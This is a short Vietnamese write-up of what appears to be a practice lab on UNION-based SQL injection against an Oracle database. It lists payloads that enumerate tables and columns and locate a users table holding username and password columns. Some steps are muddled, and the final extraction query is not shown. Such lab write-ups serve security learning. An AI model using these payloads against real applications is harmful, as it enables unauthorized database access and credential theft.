![image](https://github.com/user-attachments/assets/ee2199dd-12f1-4a23-8d6e-110634811ae4)

Bài này có cách làm na ná với bài SQL injection attack, listing the database contents on non-Oracle databases  tuy nhiên ở đây là dùng cheat seat cho ORACLE thay vì dùng của Microsoft

Mục tiêu: khai thác danh sách nội dung database từ phiên bản oracle

Lỗ hổng: Truy vấn vào category - dạng union base

Thử payload sau 

   'union select 'abc','def' from dual-- -

   ![image](https://github.com/user-attachments/assets/e58b44e9-a628-4547-967b-e668760f561b)

Ở đây có thể xác nhận rằng nó vẫn sẽ có 2 cột để tiêm vào là banner và text(theo ý hiểu của em là thế)

Payload dùng để tìm tất cả nội dung có trong table

     'union select table_name,null from all_tables-- -

![image](https://github.com/user-attachments/assets/602010dc-c601-462c-b38e-7e85355909e0)

Sau khi thành công thì ở đây có USERS_TVOCHW là khác với các cái khác nên sẽ sử dụng nó trong payload sau:

   'UNION SELECT table_name,column_name FROM all_tab_columns WHERE table_name = 'USERS_TVOCHW'-- -

   ![image](https://github.com/user-attachments/assets/b9a15d73-b523-4e87-8b6c-3ae36cb54d41)

USERS_TVOCHW
PASSWORD_HNQWRS

USERS_TVOCHW
USERNAME_NJCTHC

Ở đây do có tận 2 cái nên thử từng cái 1 với payload sau

    'UNION SELECT * FROM *-- -

Có vẻ như cả 2 đều sai do bị dính internal server error nên dùng lại cách khác 

Thử lại payload cũ 
        'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_TVOCHW'-- -

![image](https://github.com/user-attachments/assets/834a6764-6d36-4607-8df9-4c190ea073c4)

Có vẻ đây mới là thật

Thử lại 

 ![image](https://github.com/user-attachments/assets/d9db77f0-87e8-4b91-9973-085b999544cb)

xong

